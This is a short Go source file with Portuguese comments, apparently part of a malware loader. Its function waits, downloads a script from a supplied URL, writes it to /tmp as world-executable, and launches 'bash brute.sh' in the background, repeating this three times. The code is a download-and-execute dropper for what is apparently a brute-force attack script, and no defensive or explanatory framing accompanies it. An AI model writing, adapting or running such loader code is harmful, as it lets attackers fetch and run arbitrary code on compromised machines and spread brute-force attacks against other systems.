
package main



import (


"net/http"
"io/ioutil"
"os/exec"
"time"

)



func utils_down( link   string,  name_script string){  //funcao para abaixa sripts  secundarios





//function no critical



for  i := 0 ; i < 3 ; i ++ {




time.Sleep ( 60  * time.Second)




cli := http.Client{}


resp , err_get := cli.Get( link )


 if err_get != nil {


  //erro no github.com 

          continue



   }



script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


       //"erro em readall"


           continue


            }


ioutil.WriteFile("/tmp/" + name_script ,  script , 0777 )



brute :=  exec.Command("sh" , "-c" , " cd /tmp/ ; bash  brute.sh")

 
brute.Start()




}




}












